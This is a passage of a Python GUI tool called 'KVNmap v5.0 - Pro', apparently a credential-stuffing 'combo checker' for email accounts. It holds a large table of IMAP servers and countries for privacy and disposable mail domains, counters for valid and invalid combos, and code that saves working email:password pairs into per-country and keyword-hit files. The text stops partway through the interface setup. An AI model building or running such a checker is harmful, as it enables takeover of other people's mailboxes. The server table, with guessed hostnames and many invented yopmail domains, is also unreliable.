import imaplib
import concurrent.futures
import threading
import os
import sys
import socket
import time
import json
import random
from datetime import datetime
from colorama import Fore, Style, init
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import queue
import re
import hashlib
from tkinter import font as tkfont
import string
import shutil

class DarkNeonTheme:
    BG_MAIN = "#0D0D0D"
    BG_SECONDARY = "#1A1A1A"
    BG_CARD = "#242424"
    BG_INPUT = "#2A2A2A"
    BG_HOVER = "#333333"
    
    NEON_GREEN = "#00FF41"
    NEON_BLUE = "#00D4FF"
    NEON_PURPLE = "#BF00FF"
    NEON_PINK = "#FF0080"
    NEON_ORANGE = "#FF6B00"
    NEON_YELLOW = "#FFD700"
    NEON_RED = "#FF0040"
    NEON_CYAN = "#00FFD4"
    
    TEXT_PRIMARY = "#FFFFFF"
    TEXT_SECONDARY = "#AAAAAA"
    TEXT_MUTED = "#666666"
    TEXT_BRIGHT = "#F0F0F0"
    
    GRADIENT_1 = "#00FF41"
    GRADIENT_2 = "#00D4FF"
    
    FONT_FAMILY = "Consolas"
    FONT_HEADER = ("Consolas", 26, "bold")
    FONT_TITLE = ("Consolas", 14, "bold")
    FONT_BODY = ("Consolas", 10)
    FONT_SMALL = ("Consolas", 9)
    FONT_MONO = ("Consolas", 10)
    FONT_STATS = ("Consolas", 20, "bold")

IMAP_SERVERS = {
    'zoho.com': 'imap.zoho.com',
    'zoho.eu': 'imap.zoho.com',
    'zoho.in': 'imap.zoho.com',
    'zoho.com.au': 'imap.zoho.com',
    'zoho.com.cn': 'imap.zoho.com',
    'zoho.co.uk': 'imap.zoho.com',
    'fastmail.com': 'imap.fastmail.com',
    'fastmail.fm': 'imap.fastmail.com',
    'fastmail.co.uk': 'imap.fastmail.com',
    'fastmail.net': 'imap.fastmail.com',
    'fastmail.ca': 'imap.fastmail.com',
    'fastmail.de': 'imap.fastmail.com',
    'fastmail.es': 'imap.fastmail.com',
    'fastmail.fr': 'imap.fastmail.com',
    'fastmail.in': 'imap.fastmail.com',
    'fastmail.it': 'imap.fastmail.com',
    'fastmail.jp': 'imap.fastmail.com',
    'mail.com': 'imap.mail.com',
    'usa.com': 'imap.mail.com',
    'europe.com': 'imap.mail.com',
    'asia.com': 'imap.mail.com',
    'africa.com': 'imap.mail.com',
    'australia.com': 'imap.mail.com',
    'canada.com': 'imap.mail.com',
    'mexico.com': 'imap.mail.com',
    'brazil.com': 'imap.mail.com',
    'india.com': 'imap.mail.com',
    'china.com': 'imap.mail.com',
    'japan.com': 'imap.mail.com',
    'russia.com': 'imap.mail.com',
    'france.com': 'imap.mail.com',
    'germany.com': 'imap.mail.com',
    'italy.com': 'imap.mail.com',
    'spain.com': 'imap.mail.com',
    'uk.com': 'imap.mail.com',
    'hushmail.com': 'imap.hushmail.com',
    'hush.ai': 'imap.hushmail.com',
    'cyber-rights.net': 'imap.cyber-rights.net',
    'safe-mail.net': 'imap.safe-mail.net',
    'mail2world.com': 'imap.mail2world.com',
    'myway.com': 'imap.myway.com',
    'excite.com': 'imap.excite.com',
    'lycos.com': 'imap.lycos.com',
    'care2.com': 'imap.care2.com',
    'email.com': 'imap.email.com',
    'inbox.com': 'imap.inbox.com',
    'tutanota.com': 'mail.tutanota.com',
    'tutamail.com': 'mail.tutanota.com',
    'tuta.io': 'mail.tutanota.com',
    'keemail.me': 'mail.tutanota.com',
    'protonmail.com': 'mail.protonmail.com',
    'protonmail.ch': 'mail.protonmail.com',
    'pm.me': 'mail.protonmail.com',
    'protonmail.me': 'mail.protonmail.com',
    'protonmail.net': 'mail.protonmail.com',
    'protonmail.org': 'mail.protonmail.com',
    'mailfence.com': 'imap.mailfence.com',
    'countermail.com': 'imap.countermail.com',
    'riseup.net': 'mail.riseup.net',
    'autistici.org': 'mail.autistici.org',
    'inventati.org': 'mail.inventati.org',
    'mailbox.org': 'imap.mailbox.org',
    'posteo.de': 'imap.posteo.de',
    'startmail.com': 'imap.startmail.com',
    'kolabnow.com': 'imap.kolabnow.com',
    'soverin.net': 'imap.soverin.net',
    'runbox.com': 'imap.runbox.com',
    'runbox.no': 'imap.runbox.com',
    'runbox.us': 'imap.runbox.com',
    'mail.ee': 'imap.mail.ee',
    'cloud.imap': 'imap.cloud.imap',
    'disroot.org': 'imap.disroot.org',
    'snopyta.org': 'imap.snopyta.org',
    'danwin1210.me': 'imap.danwin1210.me',
    'cock.li': 'imap.cock.li',
    'morke.org': 'imap.morke.org',
    'fe8.org': 'imap.fe8.org',
    'onionmail.org': 'imap.onionmail.org',
    'opayq.com': 'imap.opayq.com',
    'mailnator.com': 'imap.mailnator.com',
    'guerrillamail.com': 'imap.guerrillamail.com',
    'guerrillamail.net': 'imap.guerrillamail.net',
    'guerrillamail.org': 'imap.guerrillamail.org',
    'guerrillamail.biz': 'imap.guerrillamail.biz',
    'spam4.me': 'imap.spam4.me',
    'spambox.us': 'imap.spambox.us',
    'trash2009.com': 'imap.trash2009.com',
    'trashymail.com': 'imap.trashymail.com',
    'trashmail.net': 'imap.trashmail.net',
    'trashmail.com': 'imap.trashmail.com',
    'trashmail.org': 'imap.trashmail.org',
    'tempemail.net': 'imap.tempemail.net',
    'tempmail.net': 'imap.tempmail.net',
    'tempmail.org': 'imap.tempmail.org',
    'temp-mail.org': 'imap.temp-mail.org',
    '10minutemail.com': 'imap.10minutemail.com',
    '10minutemail.net': 'imap.10minutemail.net',
    '10minutemail.org': 'imap.10minutemail.org',
    'minutemail.com': 'imap.minutemail.com',
    'minutemail.net': 'imap.minutemail.net',
    'minutemail.org': 'imap.minutemail.org',
    'mailinator.com': 'imap.mailinator.com',
    'mailinator.net': 'imap.mailinator.net',
    'mailinator.org': 'imap.mailinator.org',
    'maildrop.cc': 'imap.maildrop.cc',
    'maildrop.net': 'imap.maildrop.net',
    'maildrop.org': 'imap.maildrop.org',
    'mailexpire.com': 'imap.mailexpire.com',
    'mailexpire.net': 'imap.mailexpire.net',
    'mailexpire.org': 'imap.mailexpire.org',
    'getairmail.com': 'imap.getairmail.com',
    'getairmail.net': 'imap.getairmail.net',
    'getairmail.org': 'imap.getairmail.org',
    'emailondeck.com': 'imap.emailondeck.com',
    'emailondeck.net': 'imap.emailondeck.net',
    'emailondeck.org': 'imap.emailondeck.org',
    'throwawayemail.com': 'imap.throwawayemail.com',
    'throwawayemail.net': 'imap.throwawayemail.net',
    'throwawayemail.org': 'imap.throwawayemail.org',
    'dispostable.com': 'imap.dispostable.com',
    'dispostable.net': 'imap.dispostable.net',
    'dispostable.org': 'imap.dispostable.org',
    'mytemp.email': 'imap.mytemp.email',
    'mytemp.net': 'imap.mytemp.net',
    'mytemp.org': 'imap.mytemp.org',
    'tempinbox.com': 'imap.tempinbox.com',
    'tempinbox.net': 'imap.tempinbox.net',
    'tempinbox.org': 'imap.tempinbox.org',
    'e4ward.com': 'imap.e4ward.com',
    'e4ward.net': 'imap.e4ward.net',
    'e4ward.org': 'imap.e4ward.org',
    'gishpuppy.com': 'imap.gishpuppy.com',
    'gishpuppy.net': 'imap.gishpuppy.net',
    'gishpuppy.org': 'imap.gishpuppy.org',
    'nada.ltd': 'imap.nada.ltd',
    'nada.net': 'imap.nada.net',
    'nada.org': 'imap.nada.org',
    'spamgourmet.com': 'imap.spamgourmet.com',
    'spamgourmet.net': 'imap.spamgourmet.net',
    'spamgourmet.org': 'imap.spamgourmet.org',
    'spamex.com': 'imap.spamex.com',
    'spamex.net': 'imap.spamex.net',
    'spamex.org': 'imap.spamex.org',
    'mailcatch.com': 'imap.mailcatch.com',
    'mailcatch.net': 'imap.mailcatch.net',
    'mailcatch.org': 'imap.mailcatch.org',
    'mailmetrash.com': 'imap.mailmetrash.com',
    'mailmetrash.net': 'imap.mailmetrash.net',
    'mailmetrash.org': 'imap.mailmetrash.org',
    'yopmail.com': 'imap.yopmail.com',
    'yopmail.fr': 'imap.yopmail.com',
    'yopmail.net': 'imap.yopmail.com',
    'yopmail.org': 'imap.yopmail.com',
    'yopmail.co.uk': 'imap.yopmail.com',
    'yopmail.in': 'imap.yopmail.com',
    'yopmail.de': 'imap.yopmail.com',
    'yopmail.es': 'imap.yopmail.com',
    'yopmail.it': 'imap.yopmail.com',
    'yopmail.ru': 'imap.yopmail.com',
    'yopmail.pl': 'imap.yopmail.com',
    'yopmail.nl': 'imap.yopmail.com',
    'yopmail.be': 'imap.yopmail.com',
    'yopmail.ch': 'imap.yopmail.com',
    'yopmail.at': 'imap.yopmail.com',
    'yopmail.dk': 'imap.yopmail.com',
    'yopmail.se': 'imap.yopmail.com',
    'yopmail.no': 'imap.yopmail.com',
    'yopmail.fi': 'imap.yopmail.com',
    'yopmail.pt': 'imap.yopmail.com',
    'yopmail.gr': 'imap.yopmail.com',
    'yopmail.hu': 'imap.yopmail.com',
    'yopmail.ro': 'imap.yopmail.com',
    'yopmail.bg': 'imap.yopmail.com',
    'yopmail.cz': 'imap.yopmail.com',
    'yopmail.sk': 'imap.yopmail.com',
    'yopmail.hr': 'imap.yopmail.com',
    'yopmail.si': 'imap.yopmail.com',
    'yopmail.lt': 'imap.yopmail.com',
    'yopmail.lv': 'imap.yopmail.com',
    'yopmail.ee': 'imap.yopmail.com',
    'yopmail.za': 'imap.yopmail.com',
    'yopmail.ng': 'imap.yopmail.com',
    'yopmail.eg': 'imap.yopmail.com',
    'yopmail.ma': 'imap.yopmail.com',
    'yopmail.tn': 'imap.yopmail.com',
    'yopmail.dz': 'imap.yopmail.com',
    'yopmail.sa': 'imap.yopmail.com',
    'yopmail.ae': 'imap.yopmail.com',
    'yopmail.qa': 'imap.yopmail.com',
    'yopmail.om': 'imap.yopmail.com',
    'yopmail.kw': 'imap.yopmail.com',
    'yopmail.bh': 'imap.yopmail.com',
    'yopmail.jo': 'imap.yopmail.com',
    'yopmail.lb': 'imap.yopmail.com',
    'yopmail.ps': 'imap.yopmail.com',
    'yopmail.sy': 'imap.yopmail.com',
    'yopmail.iq': 'imap.yopmail.com',
    'yopmail.ir': 'imap.yopmail.com',
    'yopmail.pk': 'imap.yopmail.com',
    'yopmail.af': 'imap.yopmail.com',
    'yopmail.bd': 'imap.yopmail.com',
    'yopmail.lk': 'imap.yopmail.com',
    'yopmail.np': 'imap.yopmail.com',
    'yopmail.mv': 'imap.yopmail.com',
    'yopmail.mm': 'imap.yopmail.com',
    'yopmail.th': 'imap.yopmail.com',
    'yopmail.vn': 'imap.yopmail.com',
    'yopmail.kh': 'imap.yopmail.com',
    'yopmail.la': 'imap.yopmail.com',
    'yopmail.my': 'imap.yopmail.com',
    'yopmail.sg': 'imap.yopmail.com',
    'yopmail.ph': 'imap.yopmail.com',
    'yopmail.id': 'imap.yopmail.com',
    'yopmail.cn': 'imap.yopmail.com',
    'yopmail.tw': 'imap.yopmail.com',
    'yopmail.hk': 'imap.yopmail.com',
    'yopmail.mo': 'imap.yopmail.com',
    'yopmail.kp': 'imap.yopmail.com',
    'yopmail.kr': 'imap.yopmail.com',
    'yopmail.jp': 'imap.yopmail.com',
    'yopmail.mn': 'imap.yopmail.com',
    'yopmail.uz': 'imap.yopmail.com',
    'yopmail.tm': 'imap.yopmail.com',
    'yopmail.kg': 'imap.yopmail.com',
    'yopmail.kz': 'imap.yopmail.com',
    'yopmail.az': 'imap.yopmail.com',
    'yopmail.ge': 'imap.yopmail.com',
    'yopmail.am': 'imap.yopmail.com',
    'yopmail.al': 'imap.yopmail.com',
    'yopmail.ba': 'imap.yopmail.com',
    'yopmail.me': 'imap.yopmail.com',
    'yopmail.rs': 'imap.yopmail.com',
    'yopmail.md': 'imap.yopmail.com',
    'yopmail.ua': 'imap.yopmail.com',
    'yopmail.by': 'imap.yopmail.com',
    'yopmail.is': 'imap.yopmail.com',
    'yopmail.gl': 'imap.yopmail.com',
    'yopmail.fo': 'imap.yopmail.com',
    'yopmail.lu': 'imap.yopmail.com',
    'yopmail.mc': 'imap.yopmail.com',
    'yopmail.ad': 'imap.yopmail.com',
    'yopmail.li': 'imap.yopmail.com',
    'yopmail.sm': 'imap.yopmail.com',
    'yopmail.va': 'imap.yopmail.com',
    'yopmail.mt': 'imap.yopmail.com',
    'yopmail.cy': 'imap.yopmail.com',
    'yopmail.mu': 'imap.yopmail.com',
    'yopmail.re': 'imap.yopmail.com',
    'yopmail.yt': 'imap.yopmail.com',
    'yopmail.pf': 'imap.yopmail.com',
    'yopmail.nc': 'imap.yopmail.com',
    'yopmail.wf': 'imap.yopmail.com',
    'yopmail.pm': 'imap.yopmail.com',
    'yopmail.tf': 'imap.yopmail.com',
    'yopmail.tk': 'imap.yopmail.com',
    'yopmail.nu': 'imap.yopmail.com',
    'yopmail.to': 'imap.yopmail.com',
    'yopmail.tv': 'imap.yopmail.com',
    'yopmail.ws': 'imap.yopmail.com',
    'yopmail.fm': 'imap.yopmail.com',
    'yopmail.gd': 'imap.yopmail.com',
    'yopmail.vc': 'imap.yopmail.com',
    'yopmail.ag': 'imap.yopmail.com',
    'yopmail.bb': 'imap.yopmail.com',
    'yopmail.bs': 'imap.yopmail.com',
    'yopmail.bz': 'imap.yopmail.com',
    'yopmail.cw': 'imap.yopmail.com',
    'yopmail.dm': 'imap.yopmail.com',
    'yopmail.do': 'imap.yopmail.com',
    'yopmail.gp': 'imap.yopmail.com',
    'yopmail.gt': 'imap.yopmail.com',
    'yopmail.hn': 'imap.yopmail.com',
    'yopmail.jm': 'imap.yopmail.com',
    'yopmail.ky': 'imap.yopmail.com',
    'yopmail.lc': 'imap.yopmail.com',
    'yopmail.mq': 'imap.yopmail.com',
    'yopmail.ms': 'imap.yopmail.com',
    'yopmail.pa': 'imap.yopmail.com',
    'yopmail.sv': 'imap.yopmail.com',
    'yopmail.uy': 'imap.yopmail.com',
    'yopmail.ve': 'imap.yopmail.com',
    'yopmail.vg': 'imap.yopmail.com',
    'yopmail.vi': 'imap.yopmail.com',
    'yopmail.ai': 'imap.yopmail.com',
    'yopmail.aw': 'imap.yopmail.com',
    'yopmail.bm': 'imap.yopmail.com',
    'yopmail.fk': 'imap.yopmail.com',
    'yopmail.gi': 'imap.yopmail.com',
    'yopmail.im': 'imap.yopmail.com',
    'yopmail.je': 'imap.yopmail.com',
}

DOMAIN_COUNTRY = {
    'zoho.com': 'India',
    'zoho.eu': 'India',
    'zoho.in': 'India',
    'zoho.com.au': 'India',
    'zoho.com.cn': 'India',
    'zoho.co.uk': 'India',
    'fastmail.com': 'USA',
    'fastmail.fm': 'USA',
    'fastmail.co.uk': 'USA',
    'fastmail.net': 'USA',
    'fastmail.ca': 'USA',
    'fastmail.de': 'USA',
    'fastmail.es': 'USA',
    'fastmail.fr': 'USA',
    'fastmail.in': 'USA',
    'fastmail.it': 'USA',
    'fastmail.jp': 'USA',
    'mail.com': 'USA',
    'usa.com': 'USA',
    'europe.com': 'USA',
    'asia.com': 'USA',
    'africa.com': 'USA',
    'australia.com': 'USA',
    'canada.com': 'USA',
    'mexico.com': 'USA',
    'brazil.com': 'USA',
    'india.com': 'USA',
    'china.com': 'USA',
    'japan.com': 'USA',
    'russia.com': 'USA',
    'france.com': 'USA',
    'germany.com': 'USA',
    'italy.com': 'USA',
    'spain.com': 'USA',
    'uk.com': 'USA',
    'hushmail.com': 'Canada',
    'hush.ai': 'Canada',
    'cyber-rights.net': 'USA',
    'safe-mail.net': 'USA',
    'mail2world.com': 'USA',
    'myway.com': 'USA',
    'excite.com': 'USA',
    'lycos.com': 'USA',
    'care2.com': 'USA',
    'email.com': 'USA',
    'inbox.com': 'USA',
    'tutanota.com': 'Germany',
    'tutamail.com': 'Germany',
    'tuta.io': 'Germany',
    'keemail.me': 'Germany',
    'protonmail.com': 'Switzerland',
    'protonmail.ch': 'Switzerland',
    'pm.me': 'Switzerland',
    'protonmail.me': 'Switzerland',
    'protonmail.net': 'Switzerland',
    'protonmail.org': 'Switzerland',
    'mailfence.com': 'Belgium',
    'countermail.com': 'Sweden',
    'riseup.net': 'USA',
    'autistici.org': 'Italy',
    'inventati.org': 'Italy',
    'mailbox.org': 'Germany',
    'posteo.de': 'Germany',
    'startmail.com': 'USA',
    'kolabnow.com': 'Switzerland',
    'soverin.net': 'Netherlands',
    'runbox.com': 'Norway',
    'runbox.no': 'Norway',
    'runbox.us': 'Norway',
    'mail.ee': 'Estonia',
    'cloud.imap': 'Germany',
    'disroot.org': 'Netherlands',
    'snopyta.org': 'Finland',
    'danwin1210.me': 'USA',
    'cock.li': 'Germany',
    'morke.org': 'Germany',
    'fe8.org': 'Germany',
    'onionmail.org': 'USA',
    'opayq.com': 'USA',
    'mailnator.com': 'USA',
    'guerrillamail.com': 'USA',
    'guerrillamail.net': 'USA',
    'guerrillamail.org': 'USA',
    'guerrillamail.biz': 'USA',
    'spam4.me': 'USA',
    'spambox.us': 'USA',
    'trash2009.com': 'USA',
    'trashymail.com': 'USA',
    'trashmail.net': 'USA',
    'trashmail.com': 'USA',
    'trashmail.org': 'USA',
    'tempemail.net': 'USA',
    'tempmail.net': 'USA',
    'tempmail.org': 'USA',
    'temp-mail.org': 'USA',
    '10minutemail.com': 'USA',
    '10minutemail.net': 'USA',
    '10minutemail.org': 'USA',
    'minutemail.com': 'USA',
    'minutemail.net': 'USA',
    'minutemail.org': 'USA',
    'mailinator.com': 'USA',
    'mailinator.net': 'USA',
    'mailinator.org': 'USA',
    'maildrop.cc': 'USA',
    'maildrop.net': 'USA',
    'maildrop.org': 'USA',
    'mailexpire.com': 'USA',
    'mailexpire.net': 'USA',
    'mailexpire.org': 'USA',
    'getairmail.com': 'USA',
    'getairmail.net': 'USA',
    'getairmail.org': 'USA',
    'emailondeck.com': 'USA',
    'emailondeck.net': 'USA',
    'emailondeck.org': 'USA',
    'throwawayemail.com': 'USA',
    'throwawayemail.net': 'USA',
    'throwawayemail.org': 'USA',
    'dispostable.com': 'USA',
    'dispostable.net': 'USA',
    'dispostable.org': 'USA',
    'mytemp.email': 'USA',
    'mytemp.net': 'USA',
    'mytemp.org': 'USA',
    'tempinbox.com': 'USA',
    'tempinbox.net': 'USA',
    'tempinbox.org': 'USA',
    'e4ward.com': 'USA',
    'e4ward.net': 'USA',
    'e4ward.org': 'USA',
    'gishpuppy.com': 'USA',
    'gishpuppy.net': 'USA',
    'gishpuppy.org': 'USA',
    'nada.ltd': 'USA',
    'nada.net': 'USA',
    'nada.org': 'USA',
    'spamgourmet.com': 'USA',
    'spamgourmet.net': 'USA',
    'spamgourmet.org': 'USA',
    'spamex.com': 'USA',
    'spamex.net': 'USA',
    'spamex.org': 'USA',
    'mailcatch.com': 'USA',
    'mailcatch.net': 'USA',
    'mailcatch.org': 'USA',
    'mailmetrash.com': 'USA',
    'mailmetrash.net': 'USA',
    'mailmetrash.org': 'USA',
    'yopmail.com': 'France',
    'yopmail.fr': 'France',
    'yopmail.net': 'France',
    'yopmail.org': 'France',
    'yopmail.co.uk': 'France',
    'yopmail.in': 'France',
    'yopmail.de': 'France',
    'yopmail.es': 'France',
    'yopmail.it': 'France',
    'yopmail.ru': 'France',
    'yopmail.pl': 'France',
    'yopmail.nl': 'France',
    'yopmail.be': 'France',
    'yopmail.ch': 'France',
    'yopmail.at': 'France',
    'yopmail.dk': 'France',
    'yopmail.se': 'France',
    'yopmail.no': 'France',
    'yopmail.fi': 'France',
    'yopmail.pt': 'France',
    'yopmail.gr': 'France',
    'yopmail.hu': 'France',
    'yopmail.ro': 'France',
    'yopmail.bg': 'France',
    'yopmail.cz': 'France',
    'yopmail.sk': 'France',
    'yopmail.hr': 'France',
    'yopmail.si': 'France',
    'yopmail.lt': 'France',
    'yopmail.lv': 'France',
    'yopmail.ee': 'France',
    'yopmail.za': 'France',
    'yopmail.ng': 'France',
    'yopmail.eg': 'France',
    'yopmail.ma': 'France',
    'yopmail.tn': 'France',
    'yopmail.dz': 'France',
    'yopmail.sa': 'France',
    'yopmail.ae': 'France',
    'yopmail.qa': 'France',
    'yopmail.om': 'France',
    'yopmail.kw': 'France',
    'yopmail.bh': 'France',
    'yopmail.jo': 'France',
    'yopmail.lb': 'France',
    'yopmail.ps': 'France',
    'yopmail.sy': 'France',
    'yopmail.iq': 'France',
    'yopmail.ir': 'France',
    'yopmail.pk': 'France',
    'yopmail.af': 'France',
    'yopmail.bd': 'France',
    'yopmail.lk': 'France',
    'yopmail.np': 'France',
    'yopmail.mv': 'France',
    'yopmail.mm': 'France',
    'yopmail.th': 'France',
    'yopmail.vn': 'France',
    'yopmail.kh': 'France',
    'yopmail.la': 'France',
    'yopmail.my': 'France',
    'yopmail.sg': 'France',
    'yopmail.ph': 'France',
    'yopmail.id': 'France',
    'yopmail.cn': 'France',
    'yopmail.tw': 'France',
    'yopmail.hk': 'France',
    'yopmail.mo': 'France',
    'yopmail.kp': 'France',
    'yopmail.kr': 'France',
    'yopmail.jp': 'France',
    'yopmail.mn': 'France',
    'yopmail.uz': 'France',
    'yopmail.tm': 'France',
    'yopmail.kg': 'France',
    'yopmail.kz': 'France',
    'yopmail.az': 'France',
    'yopmail.ge': 'France',
    'yopmail.am': 'France',
    'yopmail.al': 'France',
    'yopmail.ba': 'France',
    'yopmail.me': 'France',
    'yopmail.rs': 'France',
    'yopmail.md': 'France',
    'yopmail.ua': 'France',
    'yopmail.by': 'France',
    'yopmail.is': 'France',
    'yopmail.gl': 'France',
    'yopmail.fo': 'France',
    'yopmail.lu': 'France',
    'yopmail.mc': 'France',
    'yopmail.ad': 'France',
    'yopmail.li': 'France',
    'yopmail.sm': 'France',
    'yopmail.va': 'France',
    'yopmail.mt': 'France',
    'yopmail.cy': 'France',
    'yopmail.mu': 'France',
    'yopmail.re': 'France',
    'yopmail.yt': 'France',
    'yopmail.pf': 'France',
    'yopmail.nc': 'France',
    'yopmail.wf': 'France',
    'yopmail.pm': 'France',
    'yopmail.tf': 'France',
    'yopmail.tk': 'France',
    'yopmail.nu': 'France',
    'yopmail.to': 'France',
    'yopmail.tv': 'France',
    'yopmail.ws': 'France',
    'yopmail.fm': 'France',
    'yopmail.gd': 'France',
    'yopmail.vc': 'France',
    'yopmail.ag': 'France',
    'yopmail.bb': 'France',
    'yopmail.bs': 'France',
    'yopmail.bz': 'France',
    'yopmail.cw': 'France',
    'yopmail.dm': 'France',
    'yopmail.do': 'France',
    'yopmail.gp': 'France',
    'yopmail.gt': 'France',
    'yopmail.hn': 'France',
    'yopmail.jm': 'France',
    'yopmail.ky': 'France',
    'yopmail.lc': 'France',
    'yopmail.mq': 'France',
    'yopmail.ms': 'France',
    'yopmail.pa': 'France',
    'yopmail.sv': 'France',
    'yopmail.uy': 'France',
    'yopmail.ve': 'France',
    'yopmail.vg': 'France',
    'yopmail.vi': 'France',
    'yopmail.ai': 'France',
    'yopmail.aw': 'France',
    'yopmail.bm': 'France',
    'yopmail.fk': 'France',
    'yopmail.gi': 'France',
    'yopmail.im': 'France',
    'yopmail.je': 'France',
}

def get_country_from_email(email):
    try:
        domain = email.split('@')[1].lower()
        if domain in DOMAIN_COUNTRY:
            return DOMAIN_COUNTRY[domain]
        for known_domain, country in DOMAIN_COUNTRY.items():
            if domain.endswith(known_domain):
                return country
        return 'Other'
    except:
        return 'Other'

def get_imap_server(email):
    try:
        domain = email.split('@')[1].lower()
        if domain in IMAP_SERVERS:
            return IMAP_SERVERS[domain]
        for known_domain, server in IMAP_SERVERS.items():
            if domain.endswith(known_domain):
                return server
        if domain.startswith('imap.'):
            return domain
        return f'imap.{domain}'
    except:
        return None

def sanitize_filename(filename):
    valid_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
    return ''.join(c for c in filename if c in valid_chars).strip()

class NeonButton(tk.Button):
    def __init__(self, master, text, command=None, color=DarkNeonTheme.NEON_GREEN, **kwargs):
        btn_font = kwargs.pop('font', ("Consolas", 10, "bold"))
        super().__init__(
            master,
            text=text,
            command=command,
            bg=DarkNeonTheme.BG_SECONDARY,
            fg=color,
            font=btn_font,
            relief=tk.FLAT,
            bd=2,
            padx=20,
            pady=8,
            cursor="hand2",
            activebackground=DarkNeonTheme.BG_HOVER,
            activeforeground=color,
            highlightthickness=2,
            highlightcolor=color,
            **kwargs
        )
        self.color = color
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        
    def on_enter(self, e):
        self.config(bg=self.color, fg="#000000")
        
    def on_leave(self, e):
        self.config(bg=DarkNeonTheme.BG_SECONDARY, fg=self.color)

class NeonEntry(tk.Entry):
    def __init__(self, master, **kwargs):
        super().__init__(
            master,
            bg=DarkNeonTheme.BG_INPUT,
            fg=DarkNeonTheme.TEXT_PRIMARY,
            font=("Consolas", 10),
            relief=tk.FLAT,
            bd=0,
            insertbackground=DarkNeonTheme.NEON_GREEN,
            highlightthickness=2,
            highlightcolor=DarkNeonTheme.NEON_GREEN,
            highlightbackground=DarkNeonTheme.BG_SECONDARY,
            **kwargs
        )

class NeonStatsCard(tk.Frame):
    def __init__(self, master, icon, label, color, **kwargs):
        super().__init__(master, bg=DarkNeonTheme.BG_CARD, **kwargs)
        self.color = color
        
        self.configure(highlightthickness=1, highlightcolor=color, highlightbackground=color)
        
        self.icon_label = tk.Label(
            self,
            text=icon,
            font=("Consolas", 16),
            fg=color,
            bg=DarkNeonTheme.BG_CARD
        )
        self.icon_label.pack(pady=(5, 0))
        
        self.value_label = tk.Label(
            self,
            text="0",
            font=("Consolas", 20, "bold"),
            fg=color,
            bg=DarkNeonTheme.BG_CARD
        )
        self.value_label.pack()
        
        self.name_label = tk.Label(
            self,
            text=label,
            font=("Consolas", 9),
            fg=DarkNeonTheme.TEXT_MUTED,
            bg=DarkNeonTheme.BG_CARD
        )
        self.name_label.pack(pady=(0, 5))

class KVNmap:
    def __init__(self, root):
        self.root = root
        self.root.title("KVNmap v5.0 - Pro")
        self.root.geometry("1350x850")
        self.root.configure(bg=DarkNeonTheme.BG_MAIN)
        self.root.resizable(True, True)
        self.root.minsize(1150, 750)
        
        self.is_running = False
        self.thread_pool = None
        self.combo_list = []
        self.total_combos = 0
        self.checked_combos = 0
        self.valid_combos = 0
        self.invalid_combos = 0
        self.found_combos = 0
        self.start_time = 0
        self.should_stop = False
        self.keyword_mode = False
        self.keywords = []
        self.found_keywords = set()
        self.keyword_counts = {}
        self.country_counts = {}
        
        self.log_queue = queue.Queue()
        
        self.create_results_folders()
        
        self.setup_ui()
        self.setup_worker()
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        self.log("═" * 70 + "\n", "title")
        self.log("╔═══ KVNMAP v5.0 - PRO ═══╗\n", "title")
        self.log(f"║ Providers: {len(IMAP_SERVERS):,}+              ║\n", "info")
        self.log("║ Powered by @zgoverment        ║\n", "info")
        self.log(f"║ Results: kvnResults/          ║\n", "info")
        self.log(f"║ Keyword Hits: keywordHits/    ║\n", "info")
        self.log("╚════════════════════════════════╝\n", "title")
        self.log("═" * 70 + "\n\n", "title")
    
    def create_results_folders(self):
        folders = ['kvnResults', 'keywordHits']
        for folder in folders:
            if not os.path.exists(folder):
                os.makedirs(folder)
    
    def save_valid_to_country(self, email, password):
        country = get_country_from_email(email)
        country_folder = os.path.join('kvnResults', country)
        
        if not os.path.exists(country_folder):
            os.makedirs(country_folder)
        
        filename = os.path.join(country_folder, 'valid.txt')
        with threading.Lock():
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
            
            if country not in self.country_counts:
                self.country_counts[country] = 0
            self.country_counts[country] += 1
    
    def save_keyword_hit(self, email, password, keyword):
        keyword_folder = os.path.join('keywordHits', keyword)
        
        if not os.path.exists(keyword_folder):
            os.makedirs(keyword_folder)
        
        filename = os.path.join(keyword_folder, 'hits.txt')
        with threading.Lock():
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
    
    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg=DarkNeonTheme.BG_MAIN)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=25, pady=15)
        
        self.create_header(main_frame)
        self.create_stats(main_frame)
        self.create_controls(main_frame)
        self.create_log(main_frame)
        self.create_footer(main_frame)
    
    def create_header(self, parent):
        header_frame = tk.Frame(parent, bg=DarkNeonTheme.BG_MAIN)
        header_frame.pack(fill=tk.X, pady=(0, 15))
        
        left_frame = tk.Frame(header_frame, bg=DarkNeonTheme.BG_MAIN)
        left_frame.pack(side=tk.LEFT)
        
        title_label = tk.Label(
            left_frame,
            text=">_ KVNMAP",
            font=("Consolas", 28, "bold"),
            fg=DarkNeonTheme.NEON_GREEN,
            bg=DarkNeonTheme.BG_MAIN
        )
        title_label.pack(side=tk.LEFT)
        
        version_label = tk.Label(
            left_frame,
            text="[v5.0]",
            font=("Consolas", 12),
            fg=DarkNeonTheme.TEXT_MUTED,
            bg=DarkNeonTheme.BG_MAIN
        )
        version_label.pack(side=tk.LEFT, padx=10)
        
        right_frame = tk.Frame(header_frame, bg=DarkNeonTheme.BG_MAIN)
        right_frame.pack(side=tk.RIGHT)
        
        self.status_indicator = tk.Label(
            right_frame,
            text="● READY",
            font=("Consolas", 11, "bold"),
            fg=DarkNeonTheme.NEON_GREEN,
            bg=DarkNeonTheme.BG_MAIN
        )
        self.status_indicator.pack()
    
    def create_stats(self, parent):
        stats_frame = tk.Frame(parent, bg=DarkNeonTheme.BG_MAIN)
        stats_frame.pack(fill=tk.X, pady=(0, 12))
        
        stats_config = [
            ("[T]", "Total", DarkNeonTheme.NEON_BLUE),
            ("[C]", "Checked", DarkNeonTheme.NEON_CYAN),
            ("[V]", "Valid", DarkNeonTheme.NEON_GREEN),
            ("[X]", "Invalid", DarkNeonTheme.NEON_RED),
            ("[F]", "Found", DarkNeonTheme.NEON_PURPLE),
            ("[P]", "CPM", DarkNeonTheme.NEON_ORANGE),
            ("[K]", "Keywords", DarkNeonTheme.NEON_PINK),
